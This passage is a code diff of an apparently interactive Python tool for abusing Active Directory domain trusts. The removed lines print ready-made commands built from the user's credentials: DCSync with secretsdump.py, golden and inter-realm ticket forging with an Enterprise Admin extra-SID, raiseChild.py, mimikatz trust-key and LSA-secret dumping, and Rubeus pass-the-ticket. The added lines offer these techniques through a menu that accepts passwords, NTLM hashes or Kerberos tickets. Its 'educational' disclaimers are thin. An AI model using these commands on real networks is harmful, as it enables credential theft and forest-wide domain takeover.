-                print("  %s    python3 ticketer.py -nthash <trust_key> -domain-sid <sid> -domain %s -extra-sid <target_sid>-519 golden_trust%s" % (W, trust["trustPartner"], RS))
-
-            print("\n  %s[5] DCSync Across Trust%s" % (C, RS))
-            print("  %s    python3 secretsdump.py '%s/%s:%s@%s'%s" % (W, trust["trustPartner"], self.username, self.password, trust["trustPartner"], RS))
-
-            print("\n  %s[!] All commands are for educational/dry-run purposes only.%s" % (Y, RS))
-
-    def check_sid_filtering(self):
-        """Check SID filtering status on trusts."""
-        if not self.trusts:
-            print("%s[!] No trusts to check. Run enumerate first.%s" % (Y, RS))
-            return
-
-        print("\n%s%s[ SID FILTERING STATUS ]%s" % (C, BO, RS))
-        print("─" * 70)
-
-        for trust in self.trusts:
-            partner = trust["trustPartner"]
-            attrs = trust["trustAttributes"]
-
-            print("\n  %s%sTrust: %s%s" % (BO, W, partner, RS))
-
-            if "FILTER_SIDS" in attrs or "QUARANTINED" in attrs:
-                print("  %s  ✓ SID Filtering ENABLED%s" % (G, RS))
-                print("  %s    -> SIDHistory attacks BLOCKED%s" % (G, RS))
-            else:
-                print("  %s  ✗ SID Filtering DISABLED%s" % (R, RS))
-                print("  %s    -> VULNERABLE to SIDHistory injection!%s" % (R, RS))
-                print("  %s    -> Attack: Inject Enterprise Admin SID from trusted domain%s" % (R, RS))
-
-            if "FOREST_TRANSITIVE" in attrs:
-                print("  %s  ! Forest transitive trust — Check selective authentication%s" % (Y, RS))
+            print(Fore.CYAN + "\n[1] Trust Key Extraction (requires DA)" + Style.RESET_ALL)
+            print(Fore.WHITE + "    -> Extract trust account NTLM hash via RPC/SAMR")
+            print(Fore.WHITE + "    -> Target: %s$ account in SAM database" % partner.split('.')[0].upper())
 
             if "WITHIN_FOREST" in attrs:
-                print("  %s  ! Intra-forest trust — No SID filtering by design%s" % (Y, RS))
-                print("  %s    -> All SIDs are transitive within the forest%s" % (Y, RS))
+                print(Fore.CYAN + "\n[2] Intra-Forest SIDHistory Abuse" + Style.RESET_ALL)
+                print(Fore.WHITE + "    -> Inject Enterprise Admin SID into target user sidHistory")
+                print(Fore.WHITE + "    -> Grants forest-wide Enterprise Admin privileges")
 
-        print("─" * 70)
+            if "FOREST_TRANSITIVE" in attrs:
+                print(Fore.CYAN + "\n[3] Cross-Forest TGT Forging (ExtraSIDs)" + Style.RESET_ALL)
+                print(Fore.WHITE + "    -> Forge inter-realm TGT with Enterprise Admin SID")
+                print(Fore.WHITE + "    -> Use extracted trust key for encryption")
 
-    def extract_trust_keys(self):
-        """Show commands to extract trust keys (requires DA)."""
-        print("\n%s%s[ TRUST KEY EXTRACTION ]%s" % (C, BO, RS))
-        print("%s  Requires Domain Admin or equivalent privileges%s\n" % (Y, RS))
+            if "FILTER_SIDS" not in attrs:
+                print(Fore.CYAN + "\n[4] SIDHistory Injection (No Filtering)" + Style.RESET_ALL)
+                print(Fore.WHITE + "    -> Inject arbitrary SID from trusted domain")
+                print(Fore.WHITE + "    -> Bypasses SID filtering on cross-forest trust")
 
-        print("  %sMethod 1: DCSync (remotely)%s" % (C, RS))
-        print("  %s  python3 secretsdump.py %s/%s:%s@%s -just-dc-user 'KRBTGT'%s" % (W, self.domain, self.username, self.password, self.dc_ip, RS))
-        print("  %s  python3 secretsdump.py %s/%s:%s@%s -history%s" % (W, self.domain, self.username, self.password, self.dc_ip, RS))
+            print(Fore.CYAN + "\n[5] DCSync Across Trust" + Style.RESET_ALL)
+            print(Fore.WHITE + "    -> Replicate hashes from trusted domain DC")
+            print(Fore.WHITE + "    -> Requires valid credentials in trusted domain")
 
-        print("\n  %sMethod 2: Mimikatz (on DC)%s" % (C, RS))
-        print("  %s  mimikatz # lsadump::trust /patch%s" % (W, RS))
-        print("  %s  mimikatz # lsadump::lsa /patch%s" % (W, RS))
-
-        print("\n  %sMethod 3: LSA secrets (local admin on DC)%s" % (C, RS))
-        print("  %s  mimikatz # lsadump::secrets%s" % (W, RS))
-
-        print("\n  %s[!] Trust keys enable TGT forging across domains%s" % (Y, RS))
-        print("  %s    Once extracted, use ticketer.py or Rubeus to forge inter-realm TGTs%s" % (Y, RS))
-
-    def intra_forest_abuse(self):
-        """Intra-forest trust abuse techniques."""
-        print("\n%s%s[ INTRA-FOREST TRUST ABUSE ]%s" % (C, BO, RS))
-        print("%s  Targets: Child domains, same forest%s\n" % (Y, RS))
-
-        print("  %s[1] SIDHistory Injection%s" % (C, RS))
-        print("  %s  python3 raiseChild.py child.parent.local/admin:pass@child.parent.local%s" % (W, RS))
-        print("  %s  -> Automatically elevates to Enterprise Admin in parent domain%s" % (W, RS))
-
-        print("\n  %s[2] Golden Ticket (Enterprise Admin)%s" % (C, RS))
-        print("  %s  python3 ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain %s -extra-sid <root_domain_sid>-519 golden_ticket%s" % (W, self.domain, RS))
-
-        print("\n  %s[3] DCSync Parent Domain%s" % (C, RS))
-        print("  %s  python3 secretsdump.py '%s/%s:%s@%s'%s" % (W, self.domain, self.username, self.password, self.dc_ip, RS))
-
-        print("\n  %s[!] Intra-forest trusts have NO SID filtering by design%s" % (Y, RS))
-        print("  %s    Any SID from any domain in the forest is valid everywhere%s" % (Y, RS))
-
-    def cross_forest_abuse(self):
-        """Cross-forest trust abuse techniques."""
-        print("\n%s%s[ CROSS-FOREST TRUST ABUSE ]%s" % (C, BO, RS))
-        print("%s  Targets: External forests, cross-forest trusts%s\n" % (Y, RS))
-
-        print("  %s[1] ExtraSIDs / TGT Forging%s" % (C, RS))
-        print("  %s  python3 ticketer.py -nthash <trust_key> -domain-sid <trusted_domain_sid> -domain %s -extra-sid <target_domain_sid>-519 -spn krbtgt/target.forest.local cross_forest_ticket%s" % (W, self.domain, RS))
-
-        print("\n  %s[2] raiseChild for Cross-Forest%s" % (C, RS))
-        print("  %s  python3 raiseChild.py target.forest.local/admin:pass@target.forest.local%s" % (W, RS))
-
-        print("\n  %s[3] Rubeus Cross-Forest TGT%s" % (C, RS))
-        print("  %s  Rubeus.exe asktgs /ticket:cross_forest.kirbi /service:cifs/target.forest.local /ptt%s" % (W, RS))
-
-        print("\n  %s[!] Cross-forest trusts MAY have SID filtering enabled%s" % (Y, RS))
-        print("  %s    Check SID filtering status before attempting ExtraSIDs%s" % (Y, RS))
-        print("  %s    If filtering is ON, SIDHistory injection will fail%s" % (Y, RS))
-
-    def full_exploit_chain(self):
-        """Full exploitation chain (DANGEROUS — requires confirmation)."""
-        print("\n%s%s[ ⚠ FULL EXPLOITATION CHAIN ⚠ ]%s" % (R, BO, RS))
-        print("%s  This will attempt REAL attacks on your lab environment.%s" % (R, RS))
-        print("%s  Only use on systems you OWN and CONTROL.%s\n" % (R, RS))
-
-        confirm = safe_input("  %sType 'EXPLOIT' to proceed: %s" % (R, RS))
-        if confirm != "EXPLOIT":
-            print("%s[!] Aborted. You did not type 'EXPLOIT'.%s" % (Y, RS))
-            return
-
-        print("\n  %s[*] Starting exploitation chain...%s" % (B, RS))
-
-        if not self.trusts:
-            print("  %s[!] No trusts enumerated. Running enumeration first...%s" % (Y, RS))
-            self.enumerate_trusts()
-
-        for trust in self.trusts:
-            print("\n  %s[*] Processing trust: %s%s" % (B, trust["trustPartner"], RS))
-
-            if "WITHIN_FOREST" in trust["trustAttributes"]:
-                print("  %s[!] Intra-forest detected — SIDHistory abuse viable%s" % (Y, RS))
-                print("  %s  Run: python3 raiseChild.py %s/%s:%s@%s%s" % (W, trust["trustPartner"], self.username, self.password, trust["trustPartner"], RS))
-
-            if "FOREST_TRANSITIVE" in trust["trustAttributes"]:
-                if "FILTER_SIDS" not in trust["trustAttributes"]:
-                    print("  %s[!] Cross-forest WITHOUT SID filtering — HIGH RISK%s" % (R, RS))
-                    print("  %s  Step 1: Extract trust key via DCSync%s" % (W, RS))
-                    print("  %s  Step 2: Forge inter-realm TGT with ExtraSIDs%s" % (W, RS))
-                    print("  %s  Step 3: Request service ticket in target domain%s" % (W, RS))
-                else:
-                    print("  %s[+] Cross-forest WITH SID filtering — Protected%s" % (G, RS))
-
-    def run_technique(self, choice):
-        """Execute selected technique."""
-        if choice == "1":
-            self.enumerate_trusts()
-        elif choice == "2":
-            self.decode_trusts()
-        elif choice == "3":
-            self.simulate_abuse()
-        elif choice == "4":
-            self.intra_forest_abuse()
-        elif choice == "5":
-            self.cross_forest_abuse()
-        elif choice == "6":
-            self.check_sid_filtering()
-        elif choice == "7":
-            self.extract_trust_keys()
-        elif choice == "8":
-            self.full_exploit_chain()
+            print(Fore.YELLOW + "\n[!] All techniques are for authorized testing only." + Style.RESET_ALL)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# MAIN
-# ─────────────────────────────────────────────────────────────────────────────
+# #############################################################################
+# MAIN MENU & INTERACTIVE FLOW
+# #############################################################################
+def show_menu():
+    print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+    print(Fore.CYAN + "           SELECT TRUST ABUSE TECHNIQUE" + Style.RESET_ALL)
+    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+    print("  %s[1]%s enumerate   %s-- Enumerate all domain trusts via LDAP" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
+    print("  %s[2]%s decode      %s-- Decode trust flags & risk analysis" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
+    print("  %s[3]%s simulate    %s-- Simulate abuse paths (dry-run)" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
+    print("  %s[4]%s intraforest %s-- Intra-forest SIDHistory abuse" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
+    print("  %s[5]%s crossforest %s-- Cross-forest TGT forging (ExtraSIDs)" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
+    print("  %s[6]%s sidfilter   %s-- Check SID filtering status" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
+    print("  %s[7]%s trustkeys   %s-- Extract trust keys (requires DA)" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
+    print("  %s[8]%s exploit     %s-- Full exploitation chain (DANGEROUS)" % (Fore.WHITE, Fore.CYAN, Fore.WHITE) + Style.RESET_ALL)
+    print("  %s[0]%s exit" % (Fore.WHITE, Fore.CYAN) + Style.RESET_ALL)
+    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+
+    return get_input(
+        Fore.CYAN + "\n[?] Your choice: " + Style.RESET_ALL,
+        lambda x: x in ['0', '1', '2', '3', '4', '5', '6', '7', '8'],
+        "Invalid choice! Enter 0-8"
+    )
+
+
 def main():
-    try:
-        dc_ip, domain = get_config()
-        if dc_ip is None or domain is None:
-            print("\n%s[!] Configuration cancelled.%s" % (Y, RS))
+    banner()
+
+    # -- DC IP --
+    dc_ip = get_input(
+        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
+        validate_ip, "Invalid IP! Example: 192.168.1.1"
+    )
+
+    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
+    open_ports = check_dc_ports(dc_ip)
+    if not open_ports:
+        print(Fore.RED + "[!] Cannot reach %s on common AD ports!" % dc_ip + Style.RESET_ALL)
+        cont = get_input(
+            Fore.YELLOW + "[?] Continue anyway? (y/N): " + Style.RESET_ALL,
+            default="N"
+        )
+        if cont.lower() not in ('y', 'yes'):
+            print(Fore.YELLOW + "[!] Exiting..." + Style.RESET_ALL)
             sys.exit(0)
+    else:
+        print(Fore.GREEN + "[+] DC %s reachable! Open ports: %s" % (dc_ip, ', '.join(open_ports)) + Style.RESET_ALL)
 
-        creds = get_creds()
-        if creds[0] is None:
-            print("\n%s[!] Credentials cancelled.%s" % (Y, RS))
-            sys.exit(0)
-        username, password, nt_hash = creds
+    # -- Domain --
+    domain = get_input(
+        Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
+        validate_domain, "Invalid domain! Example: corp.local"
+    )
 
-        script = TrustAbuseScript(dc_ip, domain, username, password, nt_hash)
+    # -- Auth Type --
+    print(Fore.CYAN + "\n[?] Choose authentication type:" + Style.RESET_ALL)
+    print(Fore.WHITE + "    1. Password")
+    print(Fore.WHITE + "    2. Pass-the-Hash (NTLM)")
+    print(Fore.WHITE + "    3. Pass-the-Ticket (Kerberos)")
 
-        while True:
-            if INTERRUPTED:
-                break
+    auth_choice = get_input(
+        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
+        lambda x: x in ['1', '2', '3'],
+        "Invalid choice! Enter 1, 2 or 3"
+    )
 
-            choice = show_menu()
-            if choice is None:
-                continue
+    auth_type = 'password'
+    lmhash = ''
+    nthash = ''
+    ticket_file = ''
+    password = ''
 
-            if choice == "0":
-                print("\n  %sBye!%s\n" % (Y, RS))
-                break
+    if auth_choice == '1':
+        auth_type = 'password'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        password = get_password_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)
 
-            if choice in ("1", "2", "3", "4", "5", "6", "7", "8"):
-                if choice != "1" and not script.conn:
-                    print("\n%s[!] LDAP connection required. Connecting first...%s" % (Y, RS))
-                    if not script.connect_ldap():
-                        print("%s[!] Connection failed. Cannot proceed.%s" % (R, RS))
-                        safe_input("\n  %sPress Enter to return to menu...%s" % (Y, RS))
-                        continue
+    elif auth_choice == '2':
+        auth_type = 'hash'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        hash_input = get_input(
+            Fore.CYAN + "[?] Enter NTLM Hash (LM:NT or NT): " + Style.RESET_ALL,
+            validate_hash, "Invalid hash! Format: LM:NT or just NT"
+        )
+        if ':' in hash_input:
+            lmhash, nthash = hash_input.split(':')
+        else:
+            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+            nthash = hash_input
+        lmhash = lmhash.lower()
+        nthash = nthash.lower()
 
-                if choice == "1":
-                    if not script.connect_ldap():
-                        safe_input("\n  %sPress Enter to return to menu...%s" % (Y, RS))
-                        continue
+    elif auth_choice == '3':
+        auth_type = 'ticket'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        ticket_file = get_input(
+            Fore.CYAN + "[?] Enter Ticket File Path (ccache): " + Style.RESET_ALL
+        )
+        if not os.path.exists(ticket_file):
+            print(Fore.RED + "[!] Ticket file not found: %s" % ticket_file + Style.RESET_ALL)
+            sys.exit(1)
 
-                script.run_technique(choice)
-            else:
-                print("  %sInvalid choice%s" % (R, RS))
+    # -- Verify Credentials --
+    print(Fore.YELLOW + "\n[*] Verifying credentials and domain..." + Style.RESET_ALL)
+    engine = TrustAbuseEngine(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)
 
-            try:
-                safe_input("\n  %sPress Enter to return to menu...%s" % (Y, RS))
-            except:
-                pass
-
-    except KeyboardInterrupt:
-        print("\n\n%s[!] Interrupted by user. Exiting...%s" % (Y, RS))
-        sys.exit(0)
-    except Exception as e:
-        print("\n%s[!] Fatal error: %s%s" % (R, e, RS))
+    result = engine.verify_credentials()
+    if result == "invalid_credentials":
+        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
+        sys.exit(1)
+    elif not result:
+        print(Fore.RED + "[!] Domain '%s' not found or unreachable!" % domain + Style.RESET_ALL)
         sys.exit(1)
 
+    # -- Main Menu Loop --
+    while True:
+        if INTERRUPTED:
+            break
 
-if __name__ == "__main__":
+        choice = show_menu()
+
+        if choice == '0':
+            print(Fore.YELLOW + "\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
+            break
+
+        # Connect LDAP if needed (for choices that require it)
+        if choice in ('1', '2', '4', '6'):
+            if not engine.conn:
+                if not engine.connect_ldap():
+                    print(Fore.RED + "[!] LDAP connection failed. Cannot proceed." + Style.RESET_ALL)
+                    get_input(Fore.YELLOW + "\n[*] Press Enter to continue..." + Style.RESET_ALL, allow_empty=True)
+                    continue
+
+        if choice == '1':
+            engine.enumerate_trusts()
+
+        elif choice == '2':
+            engine.decode_trusts()
+
+        elif choice == '3':
+            engine.simulate_abuse()
+
+        elif choice == '4':
+            engine.intra_forest_abuse()
+
+        elif choice == '5':
+            engine.cross_forest_abuse()
+
+        elif choice == '6':
+            engine.check_sid_filtering()
+
+        elif choice == '7':
+            engine.extract_trust_keys()
+
+        elif choice == '8':
+            engine.full_exploit_chain()
+
+        get_input(Fore.YELLOW + "\n[*] Press Enter to continue..." + Style.RESET_ALL, allow_empty=True)
+
+
+if __name__ == '__main__':
     main()
